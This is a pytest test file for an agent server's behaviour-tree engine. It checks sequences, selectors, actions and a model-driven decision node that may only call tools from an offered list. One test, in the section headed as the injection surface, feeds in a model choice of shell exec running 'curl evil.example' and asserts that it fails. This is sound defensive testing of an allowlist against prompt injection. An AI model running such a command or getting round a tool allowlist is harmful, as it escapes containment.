"""Tests for the behaviour-tree engine."""

from __future__ import annotations

import pytest

from agentserver.subagent.behaviour import (
    Action,
    BehaviourError,
    Condition,
    Context,
    Decide,
    Selector,
    Sequence,
    Status,
    parse_tree,
)


def ctx(*, tools=None, choose=None, params=None):
    calls = []

    def call_tool(server, tool, args):
        calls.append((server, tool, dict(args)))
        return (tools or {}).get((server, tool), (True, "ok"))

    c = Context(params=params or {}, call_tool=call_tool, choose=choose)
    c.blackboard["_calls"] = calls
    return c, calls


# --------------------------------------------------------------------------
# composites
# --------------------------------------------------------------------------


def test_sequence_runs_every_child_in_order(): 
    c, calls = ctx()
    tree = Sequence([Action("fs", "a", {}), Action("fs", "b", {})])
    assert tree.tick(c) is Status.SUCCESS
    assert [t for _, t, _ in calls] == ["a", "b"]


def test_sequence_stops_at_the_first_failure():
    c, calls = ctx(tools={("fs", "a"): (False, "denied")})
    tree = Sequence([Action("fs", "a", {}), Action("fs", "b", {})])
    assert tree.tick(c) is Status.FAILURE
    assert [t for _, t, _ in calls] == ["a"], "the second action should not have run"


def test_selector_takes_the_first_branch_that_succeeds():
    c, calls = ctx(tools={("fs", "a"): (False, "denied")})
    tree = Selector([Action("fs", "a", {}), Action("fs", "b", {})])
    assert tree.tick(c) is Status.SUCCESS
    assert [t for _, t, _ in calls] == ["a", "b"]


def test_a_containment_refusal_is_ordinary_control_flow():
    """The property behaviour trees are here for: a denial routes to a fallback
    rather than needing an exception path improvised somewhere."""
    c, calls = ctx(tools={("web", "fetch"): (False, "denied: resource_out_of_scope")})
    tree = Selector([
        Action("web", "fetch", {"url": "https://elsewhere.example/"}),
        Action("fs", "write", {"path": "note.md"}),
    ])
    assert tree.tick(c) is Status.SUCCESS
    assert [t for _, t, _ in calls] == ["fetch", "write"]


def test_selector_fails_only_when_every_branch_fails():
    c, _ = ctx(tools={("fs", "a"): (False, "x"), ("fs", "b"): (False, "y")})
    assert Selector([Action("fs", "a", {}), Action("fs", "b", {})]).tick(c) is Status.FAILURE


# --------------------------------------------------------------------------
# leaves
# --------------------------------------------------------------------------


def test_action_stores_its_result_on_the_blackboard():
    c, _ = ctx(tools={("fs", "read"): (True, "file contents")})
    assert Action("fs", "read", {}, store="body").tick(c) is Status.SUCCESS
    assert c.blackboard["body"] == "file contents"


def test_a_failed_action_stores_nothing():
    c, _ = ctx(tools={("fs", "read"): (False, "denied")})
    Action("fs", "read", {}, store="body").tick(c)
    assert "body" not in c.blackboard


def test_placeholders_resolve_from_params_then_blackboard():
    c, calls = ctx(params={"path": "reports/q3.md"})
    c.blackboard["suffix"] = "txt"
    Action("fs", "read", {"path": "${path}", "as": "x.${suffix}"}).tick(c)
    assert calls[0][2] == {"path": "reports/q3.md", "as": "x.txt"}


def test_an_unbound_placeholder_fails_the_action_rather_than_raising():
    c, calls = ctx()
    assert Action("fs", "read", {"path": "${nope}"}).tick(c) is Status.FAILURE
    assert calls == []


def test_condition_reads_the_blackboard():
    c, _ = ctx()
    c.blackboard["body"] = "hello"
    assert Condition("body", present=True).tick(c) is Status.SUCCESS
    assert Condition("missing", present=True).tick(c) is Status.FAILURE
    assert Condition("body", equals="hello").tick(c) is Status.SUCCESS
    assert Condition("body", equals="other").tick(c) is Status.FAILURE


# --------------------------------------------------------------------------
# the model leaf — the injection surface, and its limits
# --------------------------------------------------------------------------


def test_decide_invokes_the_tool_the_model_names():
    c, calls = ctx(choose=lambda p, b: {"server": "fs", "tool": "read", "args": {"path": "a"}})
    node = Decide("what next", [("fs", "read"), ("fs", "write")])
    assert node.tick(c) is Status.SUCCESS
    assert calls == [("fs", "read", {"path": "a"})]


def test_a_choice_outside_the_offered_options_is_a_failure_not_a_new_capability():
    """An injection can steer what the model reaches for. It cannot enlarge the
    vocabulary it reaches from."""
    c, calls = ctx(choose=lambda p, b: {"server": "shell", "tool": "exec",
                                        "args": {"cmd": "curl evil.example"}})
    node = Decide("what next", [("fs", "read")])
    assert node.tick(c) is Status.FAILURE
    assert calls == [], "an unoffered tool must never be invoked"


def test_a_decide_node_with_no_model_fails_closed():
    c, _ = ctx()
    assert Decide("x", [("fs", "read")]).tick(c) is Status.FAILURE


def test_a_model_returning_nothing_fails_closed():
    c, _ = ctx(choose=lambda p, b: None)
    assert Decide("x", [("fs", "read")]).tick(c) is Status.FAILURE


def test_a_denied_choice_still_reports_failure_upward():
    c, _ = ctx(tools={("fs", "read"): (False, "denied")},
               choose=lambda p, b: {"server": "fs", "tool": "read", "args": {}})
    assert Decide("x", [("fs", "read")]).tick(c) is Status.FAILURE


# --------------------------------------------------------------------------
# parsing — strict, and at load time
# --------------------------------------------------------------------------


def test_a_tree_parses_from_config():
    tree = parse_tree({
        "type": "sequence",
        "children": [
            {"type": "action", "server": "fs", "tool": "read",
             "args": {"path": "${path}"}, "store": "body"},
            {"type": "decide", "prompt": "summarise",
             "options": [["fs", "write"]], "store": "result"},
        ],
    })
    assert isinstance(tree, Sequence)
    assert tree.tools() == [("fs", "read"), ("fs", "write")]


@pytest.mark.parametrize("spec", [
    {"type": "eval"},
    {"type": "sequence"},
    {"type": "sequence", "children": []},
    {"type": "action", "server": "fs"},
    {"type": "action", "server": "fs", "tool": "read", "shell": True},
    {"type": "condition"},
    {"type": "decide", "options": []},
    {"type": "decide", "options": [["fs"]]},
    "not a mapping",
])
def test_malformed_trees_are_refused_at_load(spec):
    with pytest.raises(BehaviourError):
        parse_tree(spec)


def test_tools_enumerates_the_whole_subtree():
    """Used to check a role's tree cannot reach outside its capability set."""
    tree = parse_tree({
        "type": "selector",
        "children": [
            {"type": "action", "server": "web", "tool": "fetch"},
            {"type": "sequence", "children": [
                {"type": "action", "server": "fs", "tool": "read"},
                {"type": "action", "server": "fs", "tool": "write"},
            ]},
        ],
    })
    assert set(tree.tools()) == {("web", "fetch"), ("fs", "read"), ("fs", "write")}
